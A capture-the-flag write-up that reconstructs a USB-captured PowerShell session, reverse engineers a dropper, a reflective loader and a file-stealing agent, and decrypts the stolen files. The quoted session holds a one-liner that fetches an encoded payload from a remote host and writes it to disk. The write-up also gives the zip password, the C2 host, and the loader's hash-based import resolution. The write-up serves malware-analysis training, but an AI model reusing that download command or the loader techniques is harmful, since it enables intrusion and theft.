---
title: "What Did You Type: from USB keystrokes to decrypted exfiltration"
date: 2026-07-02 15:00:00 +0600
series: "crackmes.one"
platform: "crackmes.one"
summary: "Keystrokes in a USB capture lead to a dropper, a reflective loader and a file-stealing agent whose AES keys travel alongside the stolen files."
description: "Keystrokes in a USB capture lead to a dropper, a reflective loader and a file-stealing agent whose AES keys travel alongside the stolen files."
tags: ["forensics", "malware", "rev", "windows"]
---

<details class="toc" markdown="1">
<summary>Contents</summary>

* TOC
{:toc}

</details>

{% raw %}
**Challenge:** What Did You Type  
**Category:** Reverse Engineering / Forensics  

---

## Challenge Description

> We're an automotive security startup. Last night, our garage was breached (yeah, we're still garage-based :| ). We managed to capture some logs via our first-ever agent. Can you analyze them and find out what was taken? Good luck!

**Provided files:**

| File | Type | Description |
|------|------|-------------|
| `monitor_hardware` | USB pcap (USBPcap) | 116 MB, 61,760 packets |
| `monitor_network` | Ethernet pcap | 75 KB, network traffic |
| `whatdidyoutype.txt` | Text | Challenge description |

**Flag format:** `CMO{...}`

---

## Phase 1: USB Keyboard Capture Analysis

The challenge name hints at keystroke capture. The `monitor_hardware` file is a USB pcap containing HID keyboard data.

### Extraction

```bash
tshark -r monitor_hardware \
  -Y "usb.transfer_type==0x01 && usb.dst==host" \
  -T fields -e usbhid.data > usb_hid_data.txt
```

This yields **450 HID reports** from USB device `2.10.1` - 8-byte HID keyboard reports in format: `[modifier] 00 [keycode] 00 00 00 00 00`.

### Decoding

Each report is decoded using the USB HID keycode table. Modifiers `0x02`/`0x20` indicate Shift. Key-up events (keycode `0x00`) and held keys (repeated keycodes) are filtered.

**decode_usb_keyboard.py**:
```python
#!/usr/bin/env python3
import sys

hid_file = sys.argv[1] if len(sys.argv) > 1 else "usb_hid_data.txt"

# Step 1: Read HID data from file
with open(hid_file, 'r') as f:
    lines = [l.strip() for l in f if l.strip()]
print(f"Extracted {len(lines)} HID reports")

# Step 2: Decode keystrokes
hid_map = {
    0x04:'a',0x05:'b',0x06:'c',0x07:'d',0x08:'e',0x09:'f',0x0a:'g',
    0x0b:'h',0x0c:'i',0x0d:'j',0x0e:'k',0x0f:'l',0x10:'m',0x11:'n',
    0x12:'o',0x13:'p',0x14:'q',0x15:'r',0x16:'s',0x17:'t',0x18:'u',
    0x19:'v',0x1a:'w',0x1b:'x',0x1c:'y',0x1d:'z',0x1e:'1',0x1f:'2',
    0x20:'3',0x21:'4',0x22:'5',0x23:'6',0x24:'7',0x25:'8',0x26:'9',
    0x27:'0',0x28:'\n',0x29:'[ESC]',0x2a:'[BS]',0x2b:'\t',0x2c:' ',
    0x2d:'-',0x2e:'=',0x2f:'[',0x30:']',0x31:'\\',0x33:';',0x34:"'",
    0x35:'`',0x36:',',0x37:'.',0x38:'/',0x4f:'[RIGHT]',0x50:'[LEFT]',
}
hid_map_shift = {
    0x04:'A',0x05:'B',0x06:'C',0x07:'D',0x08:'E',0x09:'F',0x0a:'G',
    0x0b:'H',0x0c:'I',0x0d:'J',0x0e:'K',0x0f:'L',0x10:'M',0x11:'N',
    0x12:'O',0x13:'P',0x14:'Q',0x15:'R',0x16:'S',0x17:'T',0x18:'U',
    0x19:'V',0x1a:'W',0x1b:'X',0x1c:'Y',0x1d:'Z',0x1e:'!',0x1f:'@',
    0x20:'#',0x21:'$',0x22:'%',0x23:'^',0x24:'&',0x25:'*',0x26:'(',
    0x27:')',0x28:'\n',0x2a:'[BS]',0x2c:' ',0x2d:'_',0x2e:'+',
    0x2f:'{',0x30:'}',0x31:'|',0x33:':',0x34:'"',0x35:'~',
    0x36:'<',0x37:'>',0x38:'?',
}

result_chars = []
prev_key = 0
for line in lines:
    data = bytes.fromhex(line)
    modifier, key = data[0], data[2]
    if key == 0 or key == prev_key:
        prev_key = key if key != 0 else 0
        continue
    prev_key = key
    shift = (modifier & 0x22) != 0
    char = (hid_map_shift if shift else hid_map).get(key, f'[0x{key:02x}]')
    result_chars.append(char)

output = ''.join(result_chars)
print("\n=== Decoded Keystrokes ===")
print(output)
```

### Reconstructed Shell Session

The decoded keystrokes reveal the attacker's PowerShell session:

```powershell
powershell
ls
cd Documents
ls
[IO.File]::WriteAllBytes("$pwd\sus.zip", [Convert]::FromBase64String((irm 'https://0x0.st/PbWE.txt')))
ls
unzip
unzip -P 1m_g0d_!! sus.zip -d out
mv out\* .
./module.exe
rm *
exit
```

**Key findings:**
- **Malware URL:** `https://0x0.st/PbWE.txt` (base64-encoded zip)
- **Zip password:** `1m_g0d_!!`
- **Payload:** `module.exe`

### Obtaining the Malware

```bash
curl -s 'https://0x0.st/PbWE.txt' | base64 -d > sus.zip
unzip -P '1m_g0d_!!' sus.zip -d sus_out
# Result: module.exe - PE32+ (x86-64), 74,240 bytes
```

---

## Phase 2: Network Traffic Analysis

### HTTP Traffic to C2

```bash
tshark -r monitor_network -Y "http"
```

All traffic goes to `for-ultramar.com:9999` (IP `192.168.52.163`) from victim `192.168.52.162`.

| # | Method | Path | Description |
|---|--------|------|-------------|
| 1 | `GET` | `/` | Fetch 32-byte hash for computer-name check |
| 2+ | `POST` | `/upload` | Exfiltrate encrypted files |

- **User-Agent:** `Inquisition`
- **C2 hash** (GET / response): `66c9c5a2015ff2be075f3d430031f54d22f8ad7194363889a019350937946d74`

### Extracting Exfiltrated Files

```bash
tshark -r monitor_network -Y "http.request.method==POST" \
  -T fields -e http.file_data > all_post_data.txt
```

**extract_post_data.py**:
```python
#!/usr/bin/env python3
import sys

infile = sys.argv[1] if len(sys.argv) > 1 else "raw_post_data.txt"

with open(infile, 'r') as f:
    lines = [l.strip() for l in f if l.strip()]

with open("all_post_data.txt", "w") as f:
    for line in lines:
        f.write(line + "\n")

print(f"Extracted {len(lines)} lines from all_post_data.txt")
for i in range(0, len(lines), 2):
    fname = bytes.fromhex(lines[i]).decode('ascii')
    data_len = len(lines[i+1]) // 2
    print(f"  {fname}: {data_len} bytes encrypted")

```

POST data: hex-encoded filename, then hex-encoded encrypted data.

| File | Encrypted Size | Overhead |
|------|---------------|----------|
| `Cool_Story.docx` | 20,548 bytes | +4 key prefix |
| `hello_darkness_my_old_friend.txt` | 180 bytes | +4 key prefix |
| `IDK_why_I_saved_this.xlsx` | 10,052 bytes | +4 key prefix |
| `sexy_picture.jpg` | 33,524 bytes | +4 key prefix |

All encrypted sizes have `size % 16 == 4` - the first 4 bytes are the key prefix (explained under Reversing the Encryption Algorithm).

---

## Phase 3: Malware Outer Layer (`module.exe`)

### Static Analysis (radare2)

```bash
r2 -q -e asm.bytes=false -c 'aaa; pdf @ main' module.exe
```

### Main Function Flow (`main` @ `0x140003cc0`)

```
1. computerName = GetComputerNameA()
2. localHash = SHA-256(computerName)                    // fcn.1400034f0
3. expectedHash = HTTP_GET("http://for-ultramar.com:9999/")  // fcn.140003ac0
4. if localHash != expectedHash: exit(0)                // byte-by-byte XOR comparison
5. resource = FindResourceA(NULL, 254, 255)             // embedded 36,576-byte payload
6. plaintext = AES-256-CBC_Decrypt(resource, key=localHash, IV)
7. Execute decrypted shellcode in memory
```

### Encryption Parameters (Outer Layer)

| Parameter | Value | Source |
|-----------|-------|--------|
| Algorithm | AES-256-CBC | Key schedule with 14 rounds, S-box at `0x1400077d0` |
| Key | SHA-256(ComputerName), 32 bytes | Computed at runtime |
| IV | `0f0e0d0c0b0a09080706050403020100` | Hardcoded at `0x14000a078` in `.data` |
| Payload | 36,576 bytes | PE resource type=255, name=254 |

### The Key Insight

The C2 server returns a hash via `GET /` that the malware compares against `SHA-256(ComputerName)`. 

```bash
$ tshark -r monitor_network -Y "http.response" -T fields -e http.file_data            
66c9c5a2015ff2be075f3d430031f54d22f8ad7194363889a019350937946d74
596f7520676f6f642062726f202121
596f7520676f6f642062726f202121
596f7520676f6f642062726f202121
596f7520676f6f642062726f202121
596f7520676f6f642062726f202121
596f7520676f6f642062726f202121
596f7520676f6f642062726f202121
596f7520676f6f642062726f202121
```

If they match, the same 32-byte hash is used as the AES key. Since the C2 hash is captured in the pcap, **the C2 hash itself IS the AES key** - no need to crack the computer name.

```
C2 hash = 66c9c5a2015ff2be075f3d430031f54d22f8ad7194363889a019350937946d74
AES key = raw bytes of above (32 bytes)
```

---

## Phase 4: Decrypting the Embedded Shellcode

**decrypt_payload.py:**

```python
#!/usr/bin/env python3
"""
decrypt_payload.py - Decrypt module.exe's embedded resource using the C2 hash as AES key.

The malware fetches a SHA-256 hash from the C2 server (GET /) and compares it
against SHA-256(ComputerName). When they match, that same hash (raw 32 bytes)
is used as the AES-256-CBC key to decrypt an embedded PE resource.

Since the C2 hash IS the key, we can decrypt directly.
"""
import hashlib, sys
from Crypto.Cipher import AES

# The hash returned by the C2 server (GET http://for-ultramar.com:9999/)
C2_HASH = "66c9c5a2015ff2be075f3d430031f54d22f8ad7194363889a019350937946d74"

# Hardcoded IV from module.exe .data section at 0x14000a078
IV = bytes([0x0f,0x0e,0x0d,0x0c,0x0b,0x0a,0x09,0x08,
            0x07,0x06,0x05,0x04,0x03,0x02,0x01,0x00])

module_exe = sys.argv[1] if len(sys.argv) > 1 else "module.exe"

with open(module_exe, 'rb') as f:
    pe_data = f.read()

# The encrypted resource is at file offset 0x8ea0, size 36576 bytes
# (Can also extract via pefile: resource type=255, name=254)
RESOURCE_OFFSET = 0x8ea0
RESOURCE_SIZE   = 36576

encrypted = pe_data[RESOURCE_OFFSET:RESOURCE_OFFSET + RESOURCE_SIZE]
print(f"Encrypted resource: {len(encrypted)} bytes")

# AES key = raw 32 bytes of the C2 hash
key = bytes.fromhex(C2_HASH)
print(f"AES-256 key: {key.hex()}")
print(f"IV: {IV.hex()}")

cipher = AES.new(key, AES.MODE_CBC, IV)
decrypted = cipher.decrypt(encrypted)

with open("decrypted_shellcode.bin", 'wb') as f:
    f.write(decrypted)

print(f"Decrypted shellcode: {len(decrypted)} bytes → decrypted_shellcode.bin")
print(f"First 16 bytes: {decrypted[:16].hex()}")
```

```
Encrypted resource: 36576 bytes
AES-256 key: 66c9c5a2015ff2be075f3d430031f54d22f8ad7194363889a019350937946d74
IV: 0f0e0d0c0b0a09080706050403020100
Decrypted shellcode: 36576 bytes → decrypted_shellcode.bin
First 16 bytes: 5731c0b90a000000534883ec78488d7c
```

The result is **not** an MZ PE but raw x86-64 shellcode - a reflective PE loader.

---

## Phase 5: Reversing the Shellcode (Reflective PE Loader)

### Structure

The 36,576-byte shellcode consists of:

1. **Code section** (offsets `0x000` - `0xc6c`): The reflective loader
2. **Packed PE data** (offset `0xc6d`): 7 blobs containing an inner PE stub
3. **Config data** (offset `0x3760`): XOR-encrypted C2 agent DLL

### Packed PE Format at `0xc6d`

Header: 7 entries × 8 bytes = 56-byte table of `(offset:u32, size:u32)` pairs:

| Blob | Content | Size | Notes |
|------|---------|------|-------|
| 0 | Inner PE code section | 8,466 B | Executable code |
| 1 | (empty) | 0 B | - |
| 2 | Relocations | 48 B | XOR-encrypted |
| 3 | Import descriptors | 2,231 B | Raw import data |
| 4 | DLL names | 30 B | XOR-encrypted → `kernel32\0ntdll\0shell32\0msvcrt\0` |
| 5 | API hashes | 144 B | Custom hash-based import resolution |
| 6 | XOR key | 23 B | `496e8f59c2fe06383ffa7d31811960d15e1c5d11c44116` |

### API Hash Algorithm

The loader resolves imports by hashing export names:

```python
def api_hash(name):
    h = 0
    for b in name:
        if b == 0: continue
        if b <= 0x60: b += 0x20  # lowercase
        h = (h * 0x83 + b) & 0xFFFFFFFF
    return h
```

Resolved APIs include: `NtAllocateVirtualMemory`, `NtProtectVirtualMemory`, `NtFlushInstructionCache`, `LoadLibraryA`, `GetProcAddress`.

### Config Data Stream at `0x3760`

```
Offset  Field
0x3760  u32 flag       = 0       (0 = XOR only, no additional encryption)
0x3764  u32 data_size  = 22035
0x3768  u32 reserved   = 22035   (duplicate of data_size)
0x376c  data_blob[22035]         (XOR-encrypted)
```

The **343-byte XOR key** is runtime-generated by the reflective loader code.
It was recovered via known-plaintext analysis (XOR of encrypted blob with the
known decrypted output obtained through dynamic analysis) and is hardcoded in
the extraction script.

XOR-decrypting `data_blob` with the 343-byte key (cycling) reveals a
length-prefixed stream:

```
u32  name_len  = 11
char name[11]  = "shellcode \0"
u32  pe_len    = 22016
byte pe[22016] = MZ PE - the actual C2 agent
```

Total: 4 + 11 + 4 + 22016 = **22,035 bytes** (matches `data_size`)

---

## Phase 6: Extracting the C2 Agent (`shellcode_dll.exe`)

**extract_c2_agent.py:**

The script reads the decrypted shellcode, XOR-decrypts the config blob at `0x3760`
using the recovered 343-byte key, then parses the length-prefixed DLL name + PE data.

```python
#!/usr/bin/env python3
"""
extract_c2_agent.py - Extract the C2 agent DLL from the decrypted shellcode.

The decrypted shellcode (from decrypt_payload.py) is a reflective PE loader.
At offset 0x3760 there is a config data stream:

  0x3760  u32 flag       = 0       (0 = XOR only)
  0x3764  u32 data_size  = 22035
  0x3768  u32 reserved   = 22035   (duplicate of data_size)
  0x376c  data_blob[22035]         (XOR-encrypted)

The XOR key (343 bytes) is runtime-generated by the loader code.
It was recovered via known-plaintext analysis and is hardcoded below.

After XOR decryption the data_blob contains a length-prefixed stream:
  u32  name_len  = 11
  char name[11]  = "shellcode \\0"
  u32  pe_len    = 22016
  byte pe[22016] = MZ PE - the actual C2 agent

Usage:
  python3 extract_c2_agent.py [decrypted_shellcode.bin]
"""
import struct, sys, re

# --- 343-byte XOR key (recovered via known-plaintext analysis) ---
XOR_KEY = bytes.fromhex(
    "d21e0c2f5ec84153a1f69e122b07d1266b4aed92a8c73da08ca6009a5b64a22b"
    "77aba5e70f6e183ae8b04a6a419e9e154d43df284ac35fb81576310d8c4f6ce2"
    "ffa875eea45750f88d3cb8460e27359a0ade331f01e80dfb5da13f0dfc9eaef9"
    "25881cb81c2ae5544c263151c6df543e8f2d8b64d28b11a02983d60a823a51de"
    "7c1553ccd800132b1a333e0311edc666b57548347a20f91351a99358644a9f5d"
    "8d1f79ce97b24f432e15669ff1e6244c4790c3d2699d2db520fb11b291e769e1"
    "529e638f9d93ef00687a6a0e8632e448bc09336e3b5cb3f5ac06cc887e4c960e"
    "148101bfdc609390d6c07917aa0958d221f85e9384ab7222e877ef8f2ae92d2fa"
    "222510a36a8ac491448050a033d990be8c2ede878a067b338ce16998d0a918a0"
    "18b8a981be48b72d8b7e62eafa9347ff4dbd48de565aa1a028f1f2d84ecb041"
    "1d5652b136e87bea6625efb16e7fb0d2c2b645bf3e081b"
)

shellcode_file = sys.argv[1] if len(sys.argv) > 1 else "decrypted_shellcode.bin"

with open(shellcode_file, 'rb') as f:
    data = f.read()

print(f"Shellcode size: {len(data)} bytes")

# --- Parse config header at 0x3760 ---
CONFIG_OFFSET = 0x3760
flag = struct.unpack_from('<I', data, CONFIG_OFFSET)[0]
data_size = struct.unpack_from('<I', data, CONFIG_OFFSET + 4)[0]

print(f"\nConfig at 0x{CONFIG_OFFSET:x}:")
print(f"  flag={flag}, data_size={data_size}")

# --- XOR decrypt with known key ---
data_start = CONFIG_OFFSET + 12      # skip 12-byte header
enc_blob = bytearray(data[data_start:data_start + data_size])
key_len = len(XOR_KEY)

for i in range(data_size):
    enc_blob[i] ^= XOR_KEY[i % key_len]

decrypted = bytes(enc_blob)

# --- Parse decrypted stream: u32 name_len + name + u32 pe_len + pe_data ---
pos = 0
name_len = struct.unpack_from('<I', decrypted, pos)[0]
pos += 4
dll_name = decrypted[pos:pos + name_len]
pos += name_len
print(f"  DLL name: {dll_name!r} ({name_len} bytes)")

pe_len = struct.unpack_from('<I', decrypted, pos)[0]
pos += 4
pe_data = decrypted[pos:pos + pe_len]
pos += pe_len
print(f"  PE data: {pe_len} bytes")
print(f"  PE signature: {pe_data[:2]}")

# Save PE
with open("shellcode_dll.exe", 'wb') as f:
    f.write(pe_data)
print(f"  Saved to ./shellcode_dll.exe")

# --- PE analysis ---
try:
    import pefile
    pe = pefile.PE(data=pe_data)
    print(f"\nPE Info:")
    print(f"  Machine: 0x{pe.FILE_HEADER.Machine:x}")
    print(f"  Sections: {pe.FILE_HEADER.NumberOfSections}")
    print(f"  Entry point: 0x{pe.OPTIONAL_HEADER.AddressOfEntryPoint:x}")
    print(f"  Image base: 0x{pe.OPTIONAL_HEADER.ImageBase:x}")

    print(f"\nSections:")
    for sec in pe.sections:
        name = sec.Name.strip(b'\x00').decode()
        print(f"  {name:10s} VA=0x{sec.VirtualAddress:x} Size=0x{sec.SizeOfRawData:x} "
              f"Chars=0x{sec.Characteristics:x}")

    if hasattr(pe, 'DIRECTORY_ENTRY_EXPORT'):
        print(f"\nExports ({pe.DIRECTORY_ENTRY_EXPORT.struct.Name}):")
        for exp in pe.DIRECTORY_ENTRY_EXPORT.symbols:
            name = exp.name.decode() if exp.name else f"Ordinal_{exp.ordinal}"
            print(f"  [{exp.ordinal:3d}] 0x{exp.address:x} {name}")
    else:
        print("\nNo exports found")

    if hasattr(pe, 'DIRECTORY_ENTRY_IMPORT'):
        print(f"\nImports:")
        for entry in pe.DIRECTORY_ENTRY_IMPORT:
            dll = entry.dll.decode()
            print(f"  {dll}:")
            for imp in entry.imports:
                name = imp.name.decode() if imp.name else f"Ordinal_{imp.ordinal}"
                print(f"    {name}")
    else:
        print("\nNo imports found")
except ImportError:
    print("\n  (install pefile for detailed PE analysis)")

# --- Strings ---
print(f"\nStrings in PE:")
for match in re.finditer(rb'[\x20-\x7e]{6,}', pe_data):
    s = match.group().decode()
    print(f"  0x{match.start():x}: {s}")

print(f"\nRemaining data after PE: {len(decrypted) - pos} bytes")
```

Expected output:

```
Shellcode size: 36576 bytes

Config at 0x3760:
  flag=0, data_size=22035
  DLL name: b'shellcode \x00' (11 bytes)
  PE data: 22016 bytes
  PE signature: b'MZ'
  Saved to ./shellcode_dll.exe

PE Info:
  Machine: 0x8664
  Sections: 6
  Entry point: 0x3390
  Image base: 0x140000000

Sections:
  .text      VA=0x1000 Size=0x3000 Chars=0x60000020
  .rdata     VA=0x4000 Size=0x1800 Chars=0x40000040
  .data      VA=0x6000 Size=0x200 Chars=0xc0000040
  .pdata     VA=0x7000 Size=0x400 Chars=0x40000040
  .rsrc      VA=0x8000 Size=0x200 Chars=0x40000040
  .reloc     VA=0x9000 Size=0x200 Chars=0x42000040

No exports found

Imports:
  KERNEL32.dll:
    ReadFile
    FindFirstFileA
    FindNextFileA
    FindClose
    Sleep
    CreateFileA
    GetFileSize
    RtlLookupFunctionEntry
    GetModuleHandleW
    IsDebuggerPresent
    InitializeSListHead
    GetSystemTimeAsFileTime
    GetCurrentThreadId
    GetCurrentProcessId
    RtlCaptureContext
    RtlVirtualUnwind
    UnhandledExceptionFilter
    SetUnhandledExceptionFilter
    GetCurrentProcess
    TerminateProcess
    QueryPerformanceCounter
    IsProcessorFeaturePresent
  WININET.dll:
    HttpOpenRequestA
    InternetOpenA
    InternetConnectA
    HttpSendRequestA
    InternetCloseHandle
    HttpQueryInfoA
  VCRUNTIME140.dll:
    __current_exception
    __C_specific_handler
    __current_exception_context
    strstr
    memset
    memcpy
  api-ms-win-crt-runtime-l1-1-0.dll:
    __p___argc
    _seh_filter_exe
    _register_onexit_function
    _register_thread_local_exe_atexit_callback
    terminate
    perror
    _exit
    _c_exit
    _initterm_e
    _initterm
    __p___argv
    _crt_atexit
    _get_initial_narrow_environment
    _initialize_narrow_environment
    _configure_narrow_argv
    _cexit
    _initialize_onexit_table
    _set_app_type
    exit
  api-ms-win-crt-stdio-l1-1-0.dll:
    puts
    __p__commode
    _set_fmode
  api-ms-win-crt-heap-l1-1-0.dll:
    malloc
    _set_new_mode
  api-ms-win-crt-utility-l1-1-0.dll:
    srand
    rand
  api-ms-win-crt-time-l1-1-0.dll:
    _time64
  api-ms-win-crt-math-l1-1-0.dll:
    __setusermatherr
  api-ms-win-crt-locale-l1-1-0.dll:
    _configthreadlocale

Strings in PE:
  0x4d: !This program cannot be run in DOS mode.
  0x227: `.rdata
  0x24f: @.data
  0x278: .pdata
  0x29f: @.rsrc
  0x2c7: @.reloc
  0x1190: D$`H9D$ s;H
  0x2dfd: u0HcH<
  0x3910: ERROR: block size value must be 0 < BLOCK_SIZE < 256
  0x3948: problem with PKCS7_Padding* paddingResult
  0x3978: problem with uint8_t* dataWithPadding
  0x39a0: problem with PKCS7_Padding* unpaddingResult
  0x39d0: problem with uint8_t* dataWithoutPadding
  0x3a00: Inquisition
  0x3a10: for-ultramar.com
  0x3a28: /upload
  0x3a38: /upload
  0x3a88: 0123456789abcdef
  0x3df0: .text$mn
  0x3e04: .text$mn$00
  0x3e18: .text$x
  0x3e28: .idata$5
  0x3e3c: .00cfg
  0x3e4c: .CRT$XCA
  0x3e60: .CRT$XCAA
  0x3e74: .CRT$XCZ
  0x3e88: .CRT$XIA
  0x3e9c: .CRT$XIAA
  0x3eb0: .CRT$XIAC
  0x3ec4: .CRT$XIZ
  0x3ed8: .CRT$XPA
  0x3eec: .CRT$XPZ
  0x3f00: .CRT$XTA
  0x3f14: .CRT$XTZ
  0x3f28: .rdata
  0x3f38: .rdata$voltmd
  0x3f50: .rdata$zzzdbg
  0x3f68: .rtc$IAA
  0x3f7c: .rtc$IZZ
  0x3f90: .rtc$TAA
  0x3fa4: .rtc$TZZ
  0x3fb8: .xdata
  0x3fc8: .idata$2
  0x3fdc: .idata$3
  0x3ff0: .idata$4
  0x4004: .idata$6
  0x4038: .pdata
  0x4048: .rsrc$01
  0x405c: .rsrc$02
  0x454a: ReadFile
  0x4556: FindFirstFileA
  0x4568: FindNextFileA
  0x4578: FindClose
  0x458c: CreateFileA
  0x459a: GetFileSize
  0x45a6: KERNEL32.dll
  0x45b6: HttpQueryInfoA
  0x45c8: HttpOpenRequestA
  0x45dc: InternetOpenA
  0x45ec: InternetCloseHandle
  0x4602: HttpSendRequestA
  0x4616: InternetConnectA
  0x4628: WININET.dll
  0x4636: strstr
  0x4640: __C_specific_handler
  0x4658: __current_exception
  0x466e: __current_exception_context
  0x468c: memset
  0x4694: VCRUNTIME140.dll
  0x46b0: perror
  0x46c2: malloc
  0x46dc: _time64
  0x46e6: _seh_filter_exe
  0x46f8: _set_app_type
  0x4708: __setusermatherr
  0x471c: _configure_narrow_argv
  0x4736: _initialize_narrow_environment
  0x4758: _get_initial_narrow_environment
  0x477a: _initterm
  0x4786: _initterm_e
  0x479c: _set_fmode
  0x47aa: __p___argc
  0x47b8: __p___argv
  0x47c6: _cexit
  0x47d0: _c_exit
  0x47da: _register_thread_local_exe_atexit_callback
  0x4808: _configthreadlocale
  0x481e: _set_new_mode
  0x482e: __p__commode
  0x483e: _initialize_onexit_table
  0x485a: _register_onexit_function
  0x4876: _crt_atexit
  0x4884: terminate
  0x488e: api-ms-win-crt-runtime-l1-1-0.dll
  0x48b0: api-ms-win-crt-stdio-l1-1-0.dll
  0x48d0: api-ms-win-crt-heap-l1-1-0.dll
  0x48f0: api-ms-win-crt-utility-l1-1-0.dll
  0x4912: api-ms-win-crt-time-l1-1-0.dll
  0x4932: api-ms-win-crt-math-l1-1-0.dll
  0x4952: api-ms-win-crt-locale-l1-1-0.dll
  0x4976: RtlCaptureContext
  0x498a: RtlLookupFunctionEntry
  0x49a4: RtlVirtualUnwind
  0x49b8: UnhandledExceptionFilter
  0x49d4: SetUnhandledExceptionFilter
  0x49f2: GetCurrentProcess
  0x4a06: TerminateProcess
  0x4a1a: IsProcessorFeaturePresent
  0x4a36: QueryPerformanceCounter
  0x4a50: GetCurrentProcessId
  0x4a66: GetCurrentThreadId
  0x4a7c: GetSystemTimeAsFileTime
  0x4a96: InitializeSListHead
  0x4aac: IsDebuggerPresent
  0x4ac0: GetModuleHandleW
  0x4ad4: memcpy
  0x5260: <?xml version='1.0' encoding='UTF-8' standalone='yes'?>
  0x5299: <assembly xmlns='urn:schemas-microsoft-com:asm.v1' manifestVersion='1.0'>
  0x52e4:   <trustInfo xmlns="urn:schemas-microsoft-com:asm.v3">
  0x531c:     <security>
  0x532c:       <requestedPrivileges>
  0x5349:         <requestedExecutionLevel level='asInvoker' uiAccess='false' />
  0x5391:       </requestedPrivileges>
  0x53af:     </security>
  0x53c0:   </trustInfo>
  0x53d0: </assembly>

Remaining data after PE: 0 bytes
```

### C2 Agent Analysis

The extracted `shellcode_dll.exe` (22,016 bytes, x86-64 PE) is the file-stealing C2 agent.

**Key imports:**

| DLL | APIs |
|-----|------|
| KERNEL32 | `CreateFileA`, `ReadFile`, `GetFileSize`, `FindFirstFileA`, `FindNextFileA`, `FindClose`, `Sleep` |
| WININET | `InternetOpenA`, `InternetConnectA`, `HttpOpenRequestA`, `HttpSendRequestA`, `HttpQueryInfoA` |
| api-ms-win-crt-utility | `srand`, `rand` |
| api-ms-win-crt-time | `_time64` |
| api-ms-win-crt-heap | `malloc` |

**Key strings:** `"PKCS7_Padding"`, `"Inquisition"` (User-Agent), `"for-ultramar.com"`, `"/upload"`, `"0123456789abcdef"`

### Main Function (`main` @ `0x140002560`)

```
1. pattern = "*"
2. FindFirstFileA(pattern, &findData)
3. For each file:
     ext = strstr(filename, ".")
     if ext matches .txt/.doc/.docx/.xls/.xlsx/.png/.jpg:
         encrypt_and_exfiltrate(filename)   // fcn.140002240
     Sleep(10)
4. FindNextFileA() → loop
```

---

## Phase 7: Reversing the Encryption Algorithm

### `fcn.140002240`: Encrypt & Exfiltrate

Disassembled with radare2:

```bash
r2 -q -e asm.bytes=false -c 'aaa; pdf @ fcn.140002240' shellcode_dll.exe
```

The function implements:

```
1.  seed = _time64(0)
2.  srand(seed)
3.  key[0..3] = { rand()&0xFF, rand()&0xFF, rand()&0xFF, rand()&0xFF }
4.  expanded_key[32] = SHA-256(key[0..3])       // fcn.140003070
5.  file_data = ReadFile(filename)
6.  padded = PKCS7_Pad(file_data, block=16)     // fcn.140001e00
7.  AES_Init(&ctx, expanded_key, IV)            // fcn.140001480
8.  AES_CBC_Encrypt(&ctx, padded)               // fcn.140001d50
9.  output = malloc(padded.size + 4)
10. output[0:4] = key[0:3]                      // prepend 4 raw key bytes
11. output[4:] = encrypted_padded_data
12. HTTP_POST("/upload", filename, output)       // fcn.140001f60
```

### Crypto Details

| Parameter | Value |
|-----------|-------|
| Algorithm | AES-256-CBC |
| Key derivation | SHA-256(4 random bytes) → 32-byte key |
| IV | `0f0e0d0c0b0a09080706050403020100` (same as outer layer, hardcoded at `0x140006078`) |
| Padding | PKCS7, block size 16 |
| Output format | `[4-byte key seed] [AES-CBC ciphertext]` |

### AES-256 Confirmation

- `fcn.140001000` (key schedule): Copies 32 bytes (8 × 4-byte words), then expands to 60 words - classic AES-256 key schedule
- `fcn.140001c60` (block encrypt): Loop counter compared against `0x0e` (14) - **14 rounds = AES-256**
- Inner loop calls SubBytes (`fcn.140001580`), ShiftRows+MixColumns (`fcn.140001600`), and AddRoundKey (`fcn.1400014d0`)
- `fcn.140001d50` (CBC mode): XORs each plaintext block with previous ciphertext block before encrypting, processes in 16-byte chunks
- `fcn.140001480` (init): Runs key schedule, then copies 16-byte IV to `ctx+0xf0`

### Decryption Is Deterministic

The critical insight: **the first 4 bytes of each encrypted file ARE the random key bytes**. No need to know the PRNG seed or time - just:

1. Read first 4 bytes of encrypted data
2. SHA-256(those 4 bytes) → AES key
3. AES-256-CBC decrypt the rest with the known IV
4. Strip PKCS7 padding

---

## Phase 8: Decrypting the Exfiltrated Files & Flag

**decrypt_exfiltrated_files.py:**

```
decrypt_exfiltrated_files.py - Decrypt the 4 exfiltrated files from the network pcap.

The C2 agent (shellcode_dll.exe) encrypts files as follows:
  1. srand(time(NULL)), generate 4 random bytes: key[i] = rand() & 0xFF
  2. Expand 4-byte key to 32 bytes via SHA-256
  3. PKCS7-pad plaintext to 16-byte blocks
  4. AES-256-CBC encrypt with IV = 0f0e0d0c0b0a09080706050403020100
  5. Output = 4 random key bytes || encrypted padded data
  6. HTTP POST to C2

To decrypt: read first 4 bytes as key seed → SHA-256 → AES-256-CBC decrypt → unpad.

Usage: python3 decrypt_exfiltrated_files.py [all_post_data.txt] [output_dir]
```

```python
#!/usr/bin/env python3
import hashlib, os, sys
from Crypto.Cipher import AES

IV = bytes([0x0f,0x0e,0x0d,0x0c,0x0b,0x0a,0x09,0x08,
            0x07,0x06,0x05,0x04,0x03,0x02,0x01,0x00])

post_data_file = sys.argv[1] if len(sys.argv) > 1 else "all_post_data.txt"
output_dir     = sys.argv[2] if len(sys.argv) > 2 else "./decrypted"

with open(post_data_file) as f:
    lines = [l.strip() for l in f if l.strip()]

os.makedirs(output_dir, exist_ok=True)

for i in range(0, len(lines), 2):
    filename = bytes.fromhex(lines[i]).decode('ascii')
    data = bytes.fromhex(lines[i+1])

    # First 4 bytes = random key seed
    key_seed   = data[:4]
    ciphertext = data[4:]

    # AES-256 key = SHA-256(4 random bytes)
    key = hashlib.sha256(key_seed).digest()

    # Decrypt
    cipher = AES.new(key, AES.MODE_CBC, IV)
    plaintext = cipher.decrypt(ciphertext)

    # Remove PKCS7 padding
    pad_len = plaintext[-1]
    if 0 < pad_len <= 16 and all(b == pad_len for b in plaintext[-pad_len:]):
        plaintext = plaintext[:-pad_len]

    outpath = os.path.join(output_dir, filename)
    with open(outpath, 'wb') as f:
        f.write(plaintext)

    magic = ""
    if plaintext[:2] == b'PK':   magic = "(ZIP/Office)"
    elif plaintext[:4] == b'\xff\xd8\xff\xe0': magic = "(JPEG)"
    elif plaintext[:1].isascii(): magic = "(text)"

    print(f"  {filename:40s} → {len(plaintext):>6d} bytes  {magic}")
    print(f"    key_seed={key_seed.hex()}  aes_key={key.hex()[:16]}...")

print(f"\nDecrypted {len(lines)//2} files to {output_dir}/")
```

### Decryption Results

| File | Decrypted Size | Magic | Verification |
|------|---------------|-------|-------------|
| `Cool_Story.docx` | 20,540 B | `PK..` (ZIP/OOXML) | ✅ Valid DOCX |
